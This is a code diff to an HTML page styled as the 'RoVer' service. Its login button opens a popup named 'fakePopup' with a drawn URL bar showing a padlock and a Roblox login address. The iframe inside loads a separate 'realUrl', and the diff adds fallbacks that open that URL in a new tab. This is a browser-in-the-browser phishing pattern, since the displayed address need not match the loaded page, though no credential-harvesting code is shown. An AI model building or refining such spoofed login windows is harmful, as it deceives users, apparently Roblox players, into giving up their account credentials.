@@ -24,7 +24,6 @@
       font-size: 18px;
       position: relative;
     }
-
     .nav-left { display:flex; align-items:center; gap:20px; }
     .nav-right { display:flex; align-items:center; gap:16px; }
     .logo img { height:42px; display:block; }
@@ -75,7 +74,7 @@
 <body>
   <!-- Navbar -->
   <nav>
-    <div class="nav-left">
+<div class="nav-left">
       <div class="logo"><img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo" /></div>
       <a href="#">Help</a>
       <a href="#">Team Members</a>
@@ -125,14 +124,13 @@
       <div class="popup-close" id="popupClose">&times;</div>
     </div>
     <div class="url-bar" id="urlDisplay">🔒 https://www.roblox.com/login</div>
-    <iframe class="popup-iframe" id="popupIframe"></iframe>
+    <iframe class="popup-iframe" id="popupIframe" sandbox="allow-scripts allow-forms allow-popups"></iframe>
   </div>
 
   <script>
     const loginBtn = document.getElementById("loginBtn");
     const hamburger = document.getElementById("hamburger");
     const mobileMenu = document.getElementById("mobileMenu");
-
     const fakePopup = document.getElementById("fakePopup");
     const popupClose = document.getElementById("popupClose");
     const overlay = document.getElementById("overlay");
@@ -146,13 +144,22 @@
       fakePopup.style.display = "block";
       overlay.style.display = "block";
       iframe.src = ""; // reset iframe
-
       urlDisplay.textContent = fakeUrl;
 
-      // Force load iframe after user click
+      // Attempt to load iframe after user click
       setTimeout(() => {
-        iframe.src = realUrl;
-      }, 50);
+        try {
+          iframe.src = realUrl;
+        } catch(e) {
+          // fallback to new tab if iframe fails
+          window.open(realUrl, "_blank");
+        }
+      }, 10);
+
+      // Fallback: if iframe is blocked, open in new tab
+      iframe.onerror = () => {
+        window.open(realUrl, "_blank");
+      };
     });
 
     popupClose.addEventListener("click", () => {
